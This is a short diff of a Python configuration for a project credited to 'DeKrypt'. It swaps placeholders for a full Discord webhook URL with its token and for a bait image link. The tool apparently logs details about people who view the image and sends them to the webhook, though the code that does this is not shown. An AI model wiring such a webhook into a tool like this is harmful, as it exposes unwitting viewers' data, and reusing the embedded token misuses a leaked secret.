@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # CONFIGURAÇÃO PRINCIPAL #
-    "webhook": "SEU_WEBHOOK_AQUI",
-    "image": "https://exemplo.com/imagem.jpg",
+    "webhook": "https://discord.com/api/webhooks/1342206713813667992/ZrCTV80NToSOpDcxy7KXmUB6wIlwYfTsKwGoGADV91vLagXObWDzp9csNQbmCmAUe04G",
+    "image": "https://i1.sndcdn.com/artworks-000349102620-mufv3v-t500x500.jpg",
     "imageArgument": True,
 
     # PERSONALIZAÇÃO #
